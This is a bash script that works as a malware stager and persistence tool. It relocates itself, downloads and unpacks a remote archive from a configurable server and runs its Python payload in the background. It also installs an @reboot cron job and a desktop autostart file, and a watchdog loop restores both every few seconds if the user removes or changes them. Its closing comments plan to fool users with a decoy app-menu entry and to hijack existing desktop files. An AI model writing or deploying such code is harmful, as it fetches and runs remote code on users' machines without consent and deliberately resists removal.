#!/bin/bash

script=$(basename "$0")
script_path="$0"
BASE_DIR="/home/$(whoami)/.local/share/watcher"
PROTOCOL="http"
SERVER_IP="127.0.0.1"
PORT="8080"
AUTOSTART_FOLDER="/home/$(whoami)/.config/autostart"
DESKTOP_FILE="watcher.desktop"
mkdir -p "$BASE_DIR"


# function to fetch a file from the server
function fetch_file() {
    wget "$PROTOCOL://$SERVER_IP:$PORT/$1"
}

echo "Running $script"

# move this script to the base directory
mv "$script_path" "$BASE_DIR/$script"
cd "$BASE_DIR"

# ------------------------------------------------------------

# TODO: calculate sha256sum for all the files in the directory
# also download the sum for the files from the server. If they
# don't match, download the Target.zip again (save the 
# config.json file in the process)

# get the code if not present
if [ ! -d Target ]; then
    fetch_file Target.zip
    unzip Target.zip
    rm Target.zip
fi

# ------------------------------------------------------------
# TODO: check if python3 is installed. Install it otherwise

# run boot script as a different process
cd Target
# setsid python3 boot.py >/dev/null 2>&1 < /dev/null &
python3 boot.py &


# ------------------------------------------------------------
# check every second if this script is enabled for startup

# cronjob
this_job="@reboot bash \"$BASE_DIR/$script\""

echo "starting monitor"
while true; do
    sleep 1

    cronjobs=`crontab -l`
    status=$?

    if [ $status -eq 127 ]; then
        break
    fi
    delim="/@/"
    newline=$'\n'
    readarray -d$'\n'-t joblist <<< "$cronjobs"
    present=false
    for i in "${joblist[@]}"
    do
        i=`echo $i | sed $"s/ *$//g"`    # trim spaces
        if [[ "$i" = "$this_job" ]]; then
            present=true
            break
        fi
    done
    if [ $present = false ]; then
        cronjobs="$cronjobs"$'\n'"$this_job"$'\n'
        echo "$cronjobs" | crontab
    fi	
done &  # run in the background

# ---------------------------------------------------------------
# use ~/.config/autostart in desktop environments

# fetch the DESKTOP_FILE file
rm "$DESKTOP_FILE"
fetch_file "$DESKTOP_FILE"
status=$?
exec_path="$BASE_DIR/$script"
echo "$exec_path" >> "$DESKTOP_FILE"

# calculate the sha256sum
sum=( `sha256sum "$DESKTOP_FILE"` )
sum=${sum[0]}

mkdir -p "$AUTOSTART_FOLDER"

while true; do
    copy=false
    # keep checking if $DESKTOP_FILE exists
    if [ -f "$AUTOSTART_FOLDER/$DESKTOP_FILE" ]; then
        sleep 5
        file_sum=( `sha256sum "$AUTOSTART_FOLDER/$DESKTOP_FILE"` )
        file_sum=${file_sum[0]}
        if [ "$file_sum" != "$sum" ]; then  # $DESKTOP_FILE was changed
            copy=true
        fi
    else
        copy=true
        sleep 1
    fi
    if [ "$copy" = true ]; then
        echo "copying $DESKTOP_FILE"
        if [ ! -f "$DESKTOP_FILE" ]; then
            echo "downloading $DESKTOP_FILE"
            fetch_file "$DESKTOP_FILE"
            echo "$exec_path" >> "$DESKTOP_FILE"
        fi
        cp "$DESKTOP_FILE" "$AUTOSTART_FOLDER/$DESKTOP_FILE"
    fi
done

# -----------------------------------------------------------------

# TODO: also add a .desktop file to be shown in app menu
# so that even if the user stops all autostarts, they can 
# be fooled to open that app out of curiosity.
# or maybe make that desktop file open some other useful application
# -- Also try to affect all existing desktop files so that opening them 
# runs the target_script or something similar.

